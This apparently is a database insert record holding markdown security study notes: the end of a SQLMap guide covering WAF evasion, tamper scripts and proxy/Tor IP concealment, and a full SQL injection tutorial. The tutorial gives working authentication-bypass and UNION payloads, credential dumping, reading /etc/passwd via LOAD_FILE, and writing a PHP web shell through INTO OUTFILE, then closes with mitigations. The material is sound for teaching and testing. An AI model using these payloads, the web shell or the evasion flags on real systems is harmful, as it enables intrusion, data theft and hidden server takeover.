sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5
```

`--randomize=rp` tells SQLMap to generate a new random value for the `rp` parameter on every request. Some applications require unique values in certain parameters to prevent replay attacks. Randomizing the value on each request makes SQLMap appear as a fresh user each time.

### Calculated Parameter Bypass

```bash
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()"
```

`--eval` runs a Python code snippet before each request. Here, `import hashlib; h=hashlib.md5(id).hexdigest()` recalculates the `h` parameter as the MD5 hash of the current `id` value. Some applications require one parameter to be a hash of another — `--eval` lets SQLMap compute these dynamic values automatically.

### IP Concealment

```bash
sqlmap -u "http://www.example.com/?id=1" --proxy="socks4://177.39.187.70:33283"
```

`--proxy` routes all SQLMap traffic through the specified proxy server. This hides your real IP address. Use `--proxy-file` if you have a list of proxies — SQLMap will rotate through them automatically if any IP gets blocked.

```bash
sqlmap -u "http://www.example.com/?id=1" --tor --check-tor
```

`--tor` routes traffic through the Tor anonymity network (requires Tor to be installed and running locally on port 9050). `--check-tor` verifies that Tor is working correctly before starting the scan by checking `https://check.torproject.org/`.

### WAF Bypass

```bash
sqlmap -u "http://www.example.com/?id=1" --skip-waf
```

By default, SQLMap sends a test payload to detect if a WAF is present. `--skip-waf` skips this initial WAF detection test, producing less noise and fewer obvious malicious-looking requests at the start of the scan.

```bash
sqlmap -u "http://www.example.com/?id=1" --random-agent
```

`--random-agent` replaces SQLMap''s identifiable default User-Agent header with a random browser User-Agent. Many WAFs and security tools block requests from known tool signatures — randomizing the User-Agent is a simple first step to bypass basic header-based blocking.

### Tamper Scripts

Tamper scripts modify injection payloads before they are sent to bypass WAF filtering rules. They are specified with `--tamper`:

```bash
sqlmap -u "http://www.example.com/?id=1" --tamper=between,randomcase
```

`--tamper=between,randomcase` chains two tamper scripts together. `between` replaces `>` with `NOT BETWEEN 0 AND #` and `=` with `BETWEEN # AND #`, evading WAFs that block comparison operators. `randomcase` randomly changes the case of SQL keywords (e.g., `SELECT` becomes `SeLeCt`), bypassing case-sensitive keyword filters. Multiple tamper scripts run in priority order.

| Tamper Script | What It Does |
|---|---|
| `between` | Replaces `>` with `NOT BETWEEN 0 AND #` and `=` with `BETWEEN # AND #` |
| `randomcase` | Randomly changes SQL keyword casing (e.g., `SELECT` → `SEleCt`) |
| `space2comment` | Replaces spaces with `/**/` comments |
| `base64encode` | Base64-encodes the entire payload |
| `percentage` | Adds `%` before each character (e.g., `S` → `%S`) |
| `versionedkeywords` | Wraps keywords in MySQL versioned comments |
| `charencode` | URL-encodes characters in the payload |

```bash
sqlmap --list-tampers
```

`--list-tampers` prints a full list of all available tamper scripts with their descriptions. Use this to find the right script for the WAF you''re trying to bypass.

### Chunked Transfer Encoding

```bash
sqlmap -u "http://www.example.com/?id=1" --chunked
```

`--chunked` splits POST request bodies into small HTTP chunks. SQL keywords are split across chunk boundaries so that the WAF sees incomplete strings that don''t match its injection signatures. The server reassembles the chunks and sees the full query, but the WAF inspection sees only fragments.

### HTTP Parameter Pollution

Payloads are split across multiple values of the same parameter name (e.g., `?id=1&id=UNION&id=SELECT&id=username...`). Some platforms (like ASP) concatenate duplicate parameter values, making the final value the full injection payload — while WAFs only inspect individual parameter values which appear harmless in isolation.

---

## Advanced Database Enumeration

### Full Automation

```bash
sqlmap -u "http://www.example.com/?id=1" --all --batch --exclude-sysdbs
```

`--all` is the nuclear option — it tells SQLMap to retrieve absolutely everything it can find: version, current user, hostname, all databases, all tables, all columns, all data, and password hashes. `--batch` auto-answers all prompts. `--exclude-sysdbs` skips system databases to keep the output relevant. Warning: this can run for a very long time on large databases. All results are saved to files and can be reviewed manually afterward.

---

*These notes cover SQLMap from installation and basic usage through advanced enumeration, OS exploitation, and WAF bypass techniques.*
', NULL, 'PUBLISHED', 'PUBLIC', 21, 'cmvcsa9i0000hidr0sh1y58oz', 'cmvcr40dj0000idhkp489xa3k', to_timestamp(1792403818.28), to_timestamp(1792403818.28), NULL, NULL)
ON CONFLICT ("slug") DO UPDATE SET "title" = EXCLUDED."title", "contentMarkdown" = EXCLUDED."contentMarkdown", "contentHtml" = EXCLUDED."contentHtml", "description" = EXCLUDED."description", "status" = EXCLUDED."status", "updatedAt" = EXCLUDED."updatedAt";
INSERT INTO "Document" ("id", "title", "slug", "description", "contentMarkdown", "contentHtml", "status", "visibility", "readingTimeMin", "categoryId", "authorId", "createdAt", "updatedAt", "publishedAt", "deletedAt")
VALUES ('cmvf32eme004lida0it8p40cd', 'SQL Injection Fundamentals', 'sql-injection-fundamentals', 'Complete notes on SQL injection fundamentals covering injection types, authentication bypass via OR and comment injection, UNION-based enumeration, database/table/column discovery through INFORMATION_SCHEMA, file read/write via LOAD_FILE and INTO OUTFILE, PHP web shells, and mitigation with prepared statements, input validation, and WAF.', '# SQL Injection Fundamentals

## Table of Contents

1. [Introduction to SQL Injection](#introduction-to-sql-injection)
2. [Use of SQL in Web Applications](#use-of-sql-in-web-applications)
3. [What is an Injection?](#what-is-an-injection)
4. [SQL Injection — How It Works](#sql-injection--how-it-works)
5. [Syntax Errors in Injections](#syntax-errors-in-injections)
6. [Even vs Odd Quotes — When and Why It Matters](#even-vs-odd-quotes--when-and-why-it-matters)
   * [6.1 The Core Rule](#the-core-rule)
   * [6.2 How the Original Query Wraps Your Input](#how-the-original-query-wraps-your-input)
   * [6.3 The Even Quote Rule in Practice](#the-even-quote-rule-in-practice)
   * [6.4 Why the Trailing Quote Matters So Much](#why-the-trailing-quote-matters-so-much)
   * [6.5 Quick Decision Guide](#quick-decision-guide)
   * [6.6 Testing with One Quote First](#testing-with-one-quote-first)
7. [Types of SQL Injection](#types-of-sql-injection)
   * [7.1 In-Band SQL Injection](#in-band-sql-injection)
   * [7.2 Blind SQL Injection](#blind-sql-injection)
   * [7.3 Out-of-Band SQL Injection](#out-of-band-sql-injection)
8. [Subverting Query Logic — Authentication Bypass](#subverting-query-logic--authentication-bypass)
   * [8.1 Testing for SQLi Vulnerability](#testing-for-sqli-vulnerability)
   * [8.2 OR Injection](#or-injection)
9. [Using Comments to Bypass Authentication](#using-comments-to-bypass-authentication)
   * [9.1 Example: Comment-Based Auth Bypass](#example-comment-based-auth-bypass)
   * [9.2 Handling Parentheses](#handling-parentheses)
10. [The UNION Clause](#the-union-clause)
    * [10.1 Rules for UNION](#rules-for-union)
    * [10.2 Filling Missing Columns with Junk Data](#filling-missing-columns-with-junk-data)
11. [Union Injection — Finding Column Count and Visible Columns](#union-injection--finding-column-count-and-visible-columns)
    * [11.1 Method 1: ORDER BY to Find Column Count](#method-1-order-by-to-find-column-count)
    * [11.2 Method 2: UNION SELECT to Find Column Count](#method-2-union-select-to-find-column-count)
    * [11.3 Finding Which Columns Are Visible](#finding-which-columns-are-visible)
12. [Database Enumeration Using UNION](#database-enumeration-using-union)
    * [12.1 MySQL Fingerprinting](#mysql-fingerprinting)
    * [12.2 Finding All Databases — INFORMATION_SCHEMA.SCHEMATA](#finding-all-databases--information_schemaschemata)
    * [12.3 Finding Tables — INFORMATION_SCHEMA.TABLES](#finding-tables--information_schematables)
    * [12.4 Finding Columns — INFORMATION_SCHEMA.COLUMNS](#finding-columns--information_schemacolumns)
    * [12.5 Dumping the Data](#dumping-the-data)
13. [Reading Files via SQL Injection](#reading-files-via-sql-injection)
    * [13.1 Checking Privileges](#checking-privileges)
    * [13.2 LOAD_FILE() — Reading Server Files](#load_file--reading-server-files)
14. [Writing Files and Web Shells via SQL Injection](#writing-files-and-web-shells-via-sql-injection)
    * [14.1 Requirements to Write Files](#requirements-to-write-files)
    * [14.2 Checking secure_file_priv](#checking-secure_file_priv)
    * [14.3 SELECT INTO OUTFILE — Writing Files](#select-into-outfile--writing-files)
    * [14.4 Writing a PHP Web Shell](#writing-a-php-web-shell)
15. [Mitigating SQL Injection](#mitigating-sql-injection)
    * [15.1 Input Sanitization](#input-sanitization)
    * [15.2 Input Validation](#input-validation)
    * [15.3 Least Privilege for DB Users](#least-privilege-for-db-users)
    * [15.4 Web Application Firewall (WAF)](#web-application-firewall-waf)
    * [15.5 Parameterized Queries (Prepared Statements)](#parameterized-queries-prepared-statements)

# SQL Injection Fundamentals

---

## Introduction to SQL Injection

SQL Injection (SQLi) is one of the most dangerous and common web application vulnerabilities. It happens when a malicious user tricks a web application into sending a modified SQL query to the database. Modern web applications interact with databases in real-time — when a user sends an HTTP request, the back-end builds a SQL query and runs it against the database. If user input is used to build that query without proper checking, an attacker can manipulate it to do things the developer never intended.

SQL Injection specifically targets **relational databases** like MySQL, PostgreSQL, and MSSQL. Non-relational databases (like MongoDB) have a different type of attack called NoSQL injection, which is a separate topic. This guide focuses entirely on MySQL-based SQL injection.

---

## Use of SQL in Web Applications

Web applications connect to a database on the back-end server and use SQL queries to store and retrieve data. For example, a PHP application connects to MySQL and runs queries like `SELECT * FROM logins` to fetch user data. The results are stored in a variable and then displayed on the page.

```php
// Connect to the MySQL database
$conn = new mysqli("localhost", "root", "password", "users");

// Run a query to get all users
$query = "select * from logins";
$result = $conn->query($query);
```

This command `new mysqli(...)` creates a connection to the MySQL database running on the local machine using the given username and password. The `$conn->query($query)` part actually sends the SQL statement to the database and stores the results in `$result`.

```php
// Print each username on a new line
while($row = $result->fetch_assoc()) {
    echo $row["name"] . "<br>";
}
```

This loop goes through each row returned by the query and prints the `name` field. The `fetch_assoc()` function fetches one row at a time as an associative array (key = column name, value = column value).

When web apps use **user input** inside SQL queries (like a search box), the risk of SQL injection appears:

```php
// Take the user''s search input from a form
$searchInput = $_POST[''findUser''];

// Directly put it inside the SQL query — DANGEROUS!
$query = "select * from logins where username like ''%$searchInput''";
$result = $conn->query($query);
```

Here `$_POST[''findUser'']` takes whatever the user typed in a form. That input is directly placed inside the SQL query string using `''%$searchInput''`. If the user types a normal word, it works fine — but if they type SQL code, the database will execute it.

---

## What is an Injection?

An injection attack happens when user input is **interpreted as code** instead of plain text. Normally, a web application should treat user input as just a string — something to search for or display. But if special characters like a single quote (`''`) are not removed or escaped, the database engine sees the input as part of the SQL command itself.

**Sanitization** is the process of cleaning user input by removing or escaping special characters so they cannot break out of their intended role as plain data. If sanitization is missing, an attacker can "escape" the user input field and write their own SQL code directly into the query.

For example, if the input is `admin'' OR ''1''=''1`, the database will see this as SQL logic, not as a search term. This is the core concept behind SQL injection — the attacker makes the database run code that was never meant to run.

---

## SQL Injection — How It Works

When user input is placed directly into a SQL query without sanitization, an attacker can add a single quote (`''`) to close the string, then write their own SQL code after it.

```php
$searchInput = $_POST[''findUser''];
$query = "select * from logins where username like ''%$searchInput''";
```

If a user types `admin`, the query becomes:

```sql
select * from logins where username like ''%admin''
```

That is fine. But if the user types `1''; DROP TABLE users;`, the query becomes:

```sql
select * from logins where username like ''%1''; DROP TABLE users;''
```

The single quote after `1` closes the original string. Then `DROP TABLE users;` becomes a new SQL command that deletes the users table entirely. The trailing single quote at the end causes a syntax error in MySQL, but this demonstrates the concept of breaking out of user input boundaries.

> **Note:** Stacking two queries with `;` works in MSSQL and PostgreSQL, but **not in MySQL**. MySQL requires different techniques covered in later sections.

---

## Syntax Errors in Injections

A naive injection attempt often causes a **syntax error** because the resulting SQL is not valid. For example, an extra or unclosed quote breaks the query structure. To make an injection actually work, the attacker must ensure the final SQL query is valid — no broken strings, no unclosed parentheses.

Two common techniques to fix this:

1. **Use SQL comments** (`--` or `#`) to cut off the rest of the original query after the injection.
2. **Balance the quotes** carefully so the query remains syntactically correct.

If the attacker cannot see the source code, they must experiment with payloads to find what makes a valid query. This is a core skill in SQL injection testing.

---

## Even vs Odd Quotes — When and Why It Matters

This is one of the most important practical concepts in SQL injection. Whether you use an **even** or **odd** number of single quotes in your payload depends entirely on **how the original SQL query wraps your input**. Getting this wrong causes a syntax error and your injection fails silently.

### The Core Rule

In SQL, every string must be opened and closed with matching quotes. If there is an **odd** number of single quotes in the final query, MySQL throws a syntax error because one quote is left unclosed and hanging. Your goal as an attacker is always to make sure the **total number of quotes in the entire final query is even** — every opening quote has a matching closing quote.

### How the Original Query Wraps Your Input

The number of quotes you inject depends on what is already in the query around your input. Look at these two common patterns:

**Pattern 1 — Input is inside single quotes:**
```sql
SELECT * FROM logins WHERE username = ''$input''
```
Here your input is already wrapped in `''...''`. The query already contributes **2 quotes** around your input (one before, one after). If you inject one single quote `''`, the total becomes **3 quotes** — that is odd → syntax error. So you must either inject **zero extra quotes** (use comments to kill the rest) or inject **two quotes** to keep the count even.

**Pattern 2 — Input is NOT inside quotes (numeric parameter):**
```sql
SELECT * FROM logins WHERE id = $input
```
Here your input has no surrounding quotes at all. The query contributes **zero quotes**. You can inject freely without worrying about quote balancing — just inject SQL directly like `1 OR 1=1`.

### The Even Quote Rule in Practice

When your input IS inside single quotes, you need to "escape" out of them. Injecting **one** single quote closes the string early (good), but now the remaining `''` at the end of the original query is unclosed (bad — odd total). You fix this in one of two ways:

**Fix 1 — Use a comment to kill the trailing quote:**
```sql
-- Your input:  admin''--
-- Final query: SELECT * FROM logins WHERE username=''admin''-- '' AND password=''x''
--                                                         ^ comment kills everything after
```
You inject **one** quote to escape the string, then `--` comments out the rest including the original closing quote. The total quotes that MySQL actually processes is **2** (even) — the one before `admin` and the one you injected.

**Fix 2 — Keep an even number of quotes in your payload:**
```sql
-- Your input:  admin'' or ''1''=''1
-- Final query: SELECT * FROM logins WHERE username=''admin'' or ''1''=''1'' AND password=''x''
```
Count the quotes: `''admin''`, `''1''`, `''1''` — every string is properly opened and closed. Total quotes = even. No syntax error. This is exactly why the OR injection payload is written as `'' or ''1''=''1` and NOT `'' or ''1''=''1''` — adding that last quote would make it odd again because the original query already supplies the closing quote.

### Why the Trailing Quote Matters So Much

Look at the original query structure:

```sql
WHERE username=''[YOUR INPUT HERE]'' AND password=''x''
                                 ^
                          this quote already exists
```

When you inject `admin'' or ''1''=''1`, the query becomes:

```sql
WHERE username=''admin'' or ''1''=''1'' AND password=''x''
```

The original `''` after your input slot becomes the closing quote for `''1''`. Everything is balanced. But if you had injected `admin'' or ''1''=''1''` (one extra quote at the end), the original trailing `''` would be a 9th unpaired quote — syntax error.

### Quick Decision Guide

| Situation | What to do |
|---|---|
| Input is inside `''...''` in the query | Inject one `''` to escape, then use `-- -` to comment the rest |
| Input is inside `''...''` and you want to keep the query alive | Craft payload so total quotes in your input + surrounding ones = even |
| Input is a raw number (no quotes around it) | No quote balancing needed — inject SQL directly |
| You see an error with one `''` injected | That confirms it''s quote-wrapped and vulnerable |
| You see no error with one `''` injected | Either not vulnerable or it''s a numeric/unquoted parameter |

### Testing with One Quote First

The standard first step when discovering SQL injection is always to inject **a single quote** (`''`) and observe:

- **Syntax error appears** → Your input is inside quotes in the query. The single quote created an odd count and broke the query. The application is very likely vulnerable.
- **No error, page looks normal** → Either the app is sanitizing your input, or the parameter is numeric and your quote was just treated as invalid data.
- **Blank page or weird behavior** → Something changed — worth investigating further with different payloads.

This single-quote test is the foundation of SQLi discovery because it instantly reveals whether your input is being placed inside a quoted string context in the SQL query.

---

## Types of SQL Injection

SQL Injections are categorized based on **how and where the output is retrieved**.

### In-Band SQL Injection

The output of the injected query is returned directly in the web page response. This is the easiest type to exploit because you can read results immediately.

- **Union-Based:** The attacker adds a `UNION SELECT` statement to the original query. The injected results appear alongside the original results on the page. The attacker must know the exact number and type of columns.
- **Error-Based:** The attacker intentionally causes a SQL error that includes database information in the error message. Useful when the app shows detailed SQL errors.

### Blind SQL Injection

The web page does not display query results directly — the attacker has to figure out the data bit by bit or character by character.

- **Boolean-Based:** The attacker sends queries with true/false conditions (like `AND 1=1` vs `AND 1=2`) and observes whether the page changes. If `1=1` shows results but `1=2` shows nothing, the attacker knows the condition is being evaluated.
- **Time-Based:** Uses functions like `SLEEP(5)` to delay the server response. If the page loads slowly when `SLEEP(5)` is injected, it confirms the injection is working even when no visible change appears.

### Out-of-Band SQL Injection

The attacker cannot see results on the page at all. Instead, they trick the database into sending data to an external server they control (e.g., via a DNS lookup). This is the most advanced type and used as a last resort.

---

## Subverting Query Logic — Authentication Bypass

One of the most powerful and classic uses of SQL injection is **logging in as any user without knowing their password**. Consider this login query:

```sql
SELECT * FROM logins WHERE username=''admin'' AND password=''p@ssw0rd'';
```

This query checks both username and password. If both match a record in the database, login succeeds. If not, it fails. The `AND` operator means both conditions must be true.

### Testing for SQLi Vulnerability

Before trying to bypass login, first check if the login form is even vulnerable. Try injecting these payloads into the username field one at a time:

| Payload | URL Encoded |
|---------|-------------|
| `''`     | `%27`       |
| `"`     | `%22`       |
| `#`     | `%23`       |
| `;`     | `%3B`       |
| `)`     | `%29`       |

If injecting a single quote (`''`) causes a SQL error message instead of a normal "Login Failed" message, the form is likely vulnerable.

### OR Injection

The `AND` operator requires **both** conditions to be true. The `OR` operator only requires **one** condition to be true. Attackers exploit this by injecting an OR condition that is always true.

**Payload:** `admin'' or ''1''=''1`

This makes the query:

```sql
SELECT * FROM logins WHERE username=''admin'' OR ''1''=''1'' AND password=''something'';
```

SQL evaluates `AND` before `OR` (operator precedence). So:
- `''1''=''1'' AND password=''something''` → TRUE AND FALSE → FALSE
- `username=''admin'' OR FALSE` → if `admin` exists → TRUE

The login succeeds if `admin` exists in the database. To bypass login **without knowing any username**, inject the OR condition in both fields:

- Username: `'' or ''1''=''1`
- Password: `'' or ''1''=''1`

The final query becomes:

```sql
SELECT * FROM logins WHERE username='''' OR ''1''=''1'' AND password='''' OR ''1''=''1'';
```

This returns all rows, and the first row''s user gets logged in.

---

## Using Comments to Bypass Authentication

SQL comments let you ignore parts of a query. In MySQL, there are two ways to write comments:

- `--` followed by a space: `-- ` (note the space, often written as `-- -` to make the space visible)
- `#` symbol

```sql
-- This is a comment, everything after it is ignored
SELECT username FROM logins; -- Selects usernames from the logins table
```

The `--` tells MySQL to treat everything after it on that line as a comment — it is completely ignored during execution. This is extremely useful in SQL injection because you can cut off the rest of the original query.

### Example: Comment-Based Auth Bypass

Inject `admin''-- ` as the username:

```sql
SELECT * FROM logins WHERE username=''admin''-- '' AND password = ''something'';
```

Everything after `--` is a comment and is ignored. So the query effectively becomes:

```sql
SELECT * FROM logins WHERE username=''admin'';
```

The password check is completely gone. Login succeeds as `admin` with **any password**.

> **Browser Tip:** In a browser URL, `#` is treated as a fragment identifier and is not sent to the server. Use `%23` (the URL-encoded form of `#`) instead when injecting via the URL.

### Handling Parentheses

Some applications wrap conditions in parentheses for priority:

```sql
SELECT * FROM logins WHERE (username=''admin'' AND id > 1) AND password=''hash'';
```

Here `admin` cannot log in because the admin''s `id` is 1, and `id > 1` is false. Using `admin''--` causes a syntax error because the open parenthesis `(` is never closed.

Fix: inject `admin'')-- ` to close the parenthesis before the comment:

```sql
SELECT * FROM logins WHERE (username=''admin'')-- '' AND id > 1) AND password=''hash'';
```

The query now simply checks `username=''admin''` and ignores everything else. Login succeeds.

---

## The UNION Clause

The `UNION` clause in SQL is used to combine the results of two or more `SELECT` statements into one result set. In SQL injection, `UNION` is used to pull data from completely different tables that were not part of the original query.

```sql
-- Get data from two tables at once
SELECT * FROM ports UNION SELECT * FROM ships;
```

This command runs two separate `SELECT` queries and stacks their results together into one table. `ports` and `ships` each contribute their rows to the combined output.

### Rules for UNION

1. **Same number of columns:** Both `SELECT` statements must return the same number of columns. Otherwise MySQL returns: `ERROR 1222: The used SELECT statements have a different number of columns`.
2. **Compatible data types:** Columns in matching positions should have compatible types (numbers with numbers, strings with strings, etc.).

### Filling Missing Columns with Junk Data

If the original query has 4 columns but you only want to extract 1 column from another table, fill the remaining 3 positions with dummy values like numbers:

```sql
-- Extract username from passwords table, fill other 3 columns with junk
SELECT * FROM products WHERE product_id = ''1'' UNION SELECT username, 2, 3, 4 FROM passwords-- ''
```

The numbers `2, 3, 4` are just placeholder values. They match the required column count without meaning anything. Using numbers also makes it easy to track which column positions are visible on the page.

> **Tip:** Use `NULL` for junk columns in advanced cases since `NULL` is compatible with any data type.

---

## Union Injection — Finding Column Count and Visible Columns

Before running a useful UNION injection, you need two things:
1. **How many columns** does the original query return?
2. **Which of those columns** are actually displayed on the page?

### Method 1: ORDER BY to Find Column Count

Inject `ORDER BY` with increasing column numbers until you get an error. `ORDER BY 1` sorts by column 1, `ORDER BY 2` sorts by column 2, and so on. When you hit a number that doesn''t exist, MySQL throws an error.

```sql
'' order by 1-- -   -- Works, at least 1 column exists
'' order by 2-- -   -- Works, at least 2 columns exist
'' order by 5-- -   -- Error: "Unknown column ''5'' in ''order clause''" → table has 4 columns
```

The command `ORDER BY N` asks MySQL to sort the results by the Nth column. If that column doesn''t exist, MySQL throws an error — that tells you the table has fewer than N columns.

### Method 2: UNION SELECT to Find Column Count

Try UNION with different numbers of columns until it succeeds:

```sql
cn'' UNION select 1,2,3-- -       -- Error: column count mismatch
cn'' UNION select 1,2,3,4-- -     -- Success: table has 4 columns
```

### Finding Which Columns Are Visible

The original query might return 4 columns, but only 3 might be shown on the page (e.g., column 1 is an internal ID never displayed). To find visible columns, replace the number values with `@@version` or any real data:

```sql
cn'' UNION select 1,@@version,3,4-- -
```

`@@version` is a MySQL system variable that returns the database version string (e.g., `10.3.22-MariaDB`). If you see the version number appear on the page in column 2''s position, you know column 2 is visible and usable for data extraction.

---

## Database Enumeration Using UNION

Once you know the number of visible columns, you can start extracting real data from the database.

### MySQL Fingerprinting

Before enumerating, identify the database type to use the right queries:

| Payload | Expected MySQL Output |
|---|---|
| `SELECT @@version` | MySQL version string |
| `SELECT POW(1,1)` | Returns `1` |
| `SELECT SLEEP(5)` | Delays page by 5 seconds |

### Finding All Databases — INFORMATION_SCHEMA.SCHEMATA

MySQL has a built-in database called `INFORMATION_SCHEMA` that stores metadata about everything in the database server — all databases, all tables, all columns. You cannot directly access other databases from a query, but you can read their structure through `INFORMATION_SCHEMA`.

```sql
-- List all database names on the server
cn'' UNION select 1, schema_name, 3, 4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
```

`INFORMATION_SCHEMA.SCHEMATA` is a special table that holds one row per database. The `schema_name` column contains the database name. This query pulls all database names and displays them in column 2''s position on the page.

To find which database the web app is currently using:

```sql
cn'' UNION select 1, database(), 2, 3-- -
```

`database()` is a MySQL function that returns the name of the currently selected database. This tells you which database the web application is actively using.

### Finding Tables — INFORMATION_SCHEMA.TABLES

```sql
-- List all tables inside the ''dev'' database
cn'' UNION select 1, TABLE_NAME, TABLE_SCHEMA, 4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=''dev''-- -
```

`INFORMATION_SCHEMA.TABLES` holds metadata about every table across all databases. `TABLE_NAME` is the table name and `TABLE_SCHEMA` is the database it belongs to. The `WHERE table_schema=''dev''` filter limits results to only the `dev` database, so you don''t get thousands of rows from every database at once.

### Finding Columns — INFORMATION_SCHEMA.COLUMNS

```sql
-- Find all column names inside the ''credentials'' table
cn'' UNION select 1, COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=''credentials''-- -
```

`INFORMATION_SCHEMA.COLUMNS` stores information about every column in every table. `COLUMN_NAME` gives you the column names. After finding that `credentials` has `username` and `password` columns, you can dump the actual data.

### Dumping the Data

```sql
-- Extract username and password from the credentials table in the dev database
cn'' UNION select 1, username, password, 4 FROM dev.credentials-- -
```

The `dev.credentials` syntax uses the **dot operator** to reference a table (`credentials`) inside a specific database (`dev`). This is necessary because the web app''s current database is `ilfreight`, not `dev`. Without the dot operator, MySQL would look for `credentials` in the wrong database.

---

## Reading Files via SQL Injection

SQL injection can go beyond just reading database data — it can read files from the server''s file system too.

### Checking Privileges

To read files, the database user needs the `FILE` privilege. First check who you are:

```sql
-- Find the current database user
cn'' UNION SELECT 1, user(), 3, 4-- -
```

`user()` is a MySQL function that returns the name of the currently connected database user (e.g., `root@localhost`). Knowing you''re `root` is a strong indicator you have elevated privileges.

Then check for super privileges:

```sql
-- Check if current user has superuser privilege
cn'' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

`mysql.user` is a system table that stores all database user accounts and their permissions. `super_priv` is `Y` (yes) if the user has superuser rights. Superuser means almost no restrictions inside the database.

Check specific FILE privilege:

```sql
-- List all specific privileges for root user
cn'' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="''root''@''localhost''"-- -
```

`information_schema.user_privileges` stores which specific SQL privileges are granted to each user. If `FILE` appears in `privilege_type`, the user can read and write files on the server.

### LOAD_FILE() — Reading Server Files

```sql
-- Read the /etc/passwd file (Linux user accounts)
cn'' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

`LOAD_FILE("/etc/passwd")` is a MySQL function that reads the entire contents of the specified file from the server''s file system and returns it as a string. The `/etc/passwd` file in Linux stores user account information. If the MySQL OS user has read permission on the file, its contents appear on the page.

You can also read web application source code:

```sql
-- Read the PHP source code of the search page
cn'' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

This reads the PHP file that serves the page you''re currently on. Finding database credentials, logic flaws, or other vulnerabilities in the source code is a very common step in advanced exploitation.

---

## Writing Files and Web Shells via SQL Injection

Writing files is more restricted than reading them, but if allowed, it can lead to full server compromise.

### Requirements to Write Files

1. Database user must have the `FILE` privilege.
2. The MySQL `secure_file_priv` variable must allow writes (must be empty, not NULL).
3. The MySQL process must have OS-level write access to the target directory.

### Checking secure_file_priv

```sql
-- Check the value of secure_file_priv global variable
cn'' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -
```

`information_schema.global_variables` stores all MySQL global configuration variables. `secure_file_priv` controls which directory MySQL can read/write files from. If the value is **empty**, MySQL can access any directory. If it''s a path, only that directory. If it''s `NULL`, file operations are completely disabled.

### SELECT INTO OUTFILE — Writing Files

```sql
-- Write a test string to a file on the server
SELECT ''this is a test'' INTO OUTFILE ''/tmp/test.txt'';
```

`INTO OUTFILE ''/path/to/file''` is a MySQL clause that redirects the output of a `SELECT` query into a file on the server''s file system instead of returning it to the user. The MySQL process must have write permission to the specified directory.

Test writing to the web root:

```sql
-- Write a simple test to confirm write access to the web folder
cn'' UNION SELECT 1, ''file written successfully!'', 3, 4 INTO OUTFILE ''/var/www/html/proof.txt''-- -
```

`/var/www/html/` is the default root folder for Apache web servers on Linux — any file placed here is accessible through the browser. If the file appears when you browse to `http://TARGET/proof.txt`, write access is confirmed.

### Writing a PHP Web Shell

A web shell is a small script uploaded to the server that lets you run OS commands through the browser.

```sql
-- Write a PHP web shell to the web root
cn'' UNION SELECT "", ''<?php system($_REQUEST[0]); ?>'', "", "" INTO OUTFILE ''/var/www/html/shell.php''-- -
```

`<?php system($_REQUEST[0]); ?>` is a PHP one-liner. `$_REQUEST[0]` takes the value of the `0` parameter from the URL. `system()` runs it as an OS shell command and prints the output. Empty strings `""` are used instead of numbers so the file is cleaner (no `1 3 4` junk in the output).

Access the shell and run commands:

```
http://TARGET/shell.php?0=id
```

The `?0=id` part passes the `id` command as the value of parameter `0`. The `id` command in Linux prints the current user and group, confirming code execution. If you see something like `uid=33(www-data)`, your injected shell is running on the server.

---

## Mitigating SQL Injection

Knowing how SQL injection works is only half the battle — the other half is preventing it.

### 1. Input Sanitization

Use functions that escape special characters before they go into a SQL query. In PHP with MySQL, `mysqli_real_escape_string()` escapes characters like `''`, `"`, and `\` so they are treated as literal text, not SQL syntax.

```php
// Escape user input before using it in a query
$username = mysqli_real_escape_string($conn, $_POST[''username'']);
$password = mysqli_real_escape_string($conn, $_POST[''password'']);
```

`mysqli_real_escape_string($conn, $input)` takes the database connection and the raw input string. It adds backslashes before dangerous characters. For example, `admin''--` becomes `admin\''--` — the single quote is neutralized and cannot break out of the string.

### 2. Input Validation

Validate that user input matches the **expected format** before using it at all. Use regular expressions to reject anything that doesn''t fit.

```php
// Only allow letters and spaces — reject anything else
$pattern = "/^[A-Za-z\s]+$/";
$code = $_GET["port_code"];

if (!preg_match($pattern, $code)) {
    die("Invalid input! Please try again.");
}
```

`preg_match($pattern, $input)` checks if the input matches the regex pattern. `^[A-Za-z\s]+$` means: start to end, only letters (uppercase or lowercase) and whitespace are allowed. Anything else — numbers, quotes, semicolons — causes `preg_match` to return false and the script immediately stops with an error message.

### 3. Least Privilege for DB Users

Never connect web applications to the database as `root` or any admin user. Create a dedicated user with only the permissions needed.

```sql
-- Create a new limited user
CREATE USER ''reader''@''localhost'';

-- Grant only SELECT on the specific table needed
GRANT SELECT ON ilfreight.ports TO ''reader''@''localhost'' IDENTIFIED BY ''p@ssw0Rd!!'';
```

`CREATE USER` makes a new MySQL account. `GRANT SELECT ON ilfreight.ports TO ''reader''@''localhost''` gives this user permission to only run `SELECT` queries on the single `ports` table in the `ilfreight` database — nothing else. Even if SQL injection occurs with this user, the attacker cannot `DROP` tables, `INSERT` data, or read from other tables.

### 4. Web Application Firewall (WAF)

A WAF sits between users and the web server and inspects incoming requests for malicious patterns. It blocks requests containing SQL injection signatures like `UNION SELECT`, `DROP TABLE`, `INFORMATION_SCHEMA`, etc.

- **Open-source:** ModSecurity
- **Commercial/Cloud:** Cloudflare WAF

WAFs are not perfect and can be bypassed, but they add a strong layer of defense and stop most automated attacks.

### 5. Parameterized Queries (Prepared Statements)

This is the most effective prevention method. Instead of building SQL strings with user input concatenated in, use **placeholders** (`?`) that the database fills in safely after the query structure is already set.

```php
// Use placeholders instead of directly inserting user input
$query = "SELECT * FROM logins WHERE username=? AND password=?";
$stmt = mysqli_prepare($conn, $query);

// Bind the actual values — MySQL handles escaping automatically
mysqli_stmt_bind_param($stmt, ''ss'', $username, $password);
mysqli_stmt_execute($stmt);
```

